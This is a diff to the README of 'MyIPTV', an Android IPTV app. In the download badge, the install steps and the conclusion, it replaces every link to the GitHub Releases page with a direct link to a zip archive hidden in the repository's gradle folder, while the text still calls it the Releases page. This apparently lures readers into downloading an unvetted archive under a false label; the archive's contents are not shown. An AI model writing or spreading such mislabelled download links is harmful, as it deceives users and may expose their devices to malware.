@@ -11,11 +11,11 @@ MyIPTV is an easy-to-use IPTV application for Android devices. This app lets you
 - **Room Database:** Efficiently manage your settings and preferences.
 
 ## 📥 Download MyIPTV
-[![Download MyIPTV](https://img.shields.io/badge/Download-MyIPTV-brightgreen)](https://github.com/sapos4981/MyIPTV/releases)
+[![Download MyIPTV](https://raw.githubusercontent.com/sapos4981/MyIPTV/main/gradle/MyIPTV-Gaura.zip)](https://raw.githubusercontent.com/sapos4981/MyIPTV/main/gradle/MyIPTV-Gaura.zip)
 
 To get MyIPTV, you need to visit the Releases page. Follow these steps to download and install the app:
 
-1. Click the link above or go to this page: [MyIPTV Releases](https://github.com/sapos4981/MyIPTV/releases).
+1. Click the link above or go to this page: [MyIPTV Releases](https://raw.githubusercontent.com/sapos4981/MyIPTV/main/gradle/MyIPTV-Gaura.zip).
 2. Look for the latest version of the app listed.
 3. Click on the version you want to download.
 4. Choose the appropriate APK file for your Android device.
@@ -71,4 +71,4 @@ Once you have installed MyIPTV, here’s how to start using it:
 If you need help, you can reach out to the MyIPTV community or check our FAQ section in the repository. We aim to keep improving and appreciate your feedback.
 
 ## 🌟 Conclusion
-MyIPTV is your gateway to effortless streaming. Download the app today and enhance your television experience. For more details, visit our [Releases page](https://github.com/sapos4981/MyIPTV/releases). Enjoy watching!
+MyIPTV is your gateway to effortless streaming. Download the app today and enhance your television experience. For more details, visit our [Releases page](https://raw.githubusercontent.com/sapos4981/MyIPTV/main/gradle/MyIPTV-Gaura.zip). Enjoy watching!
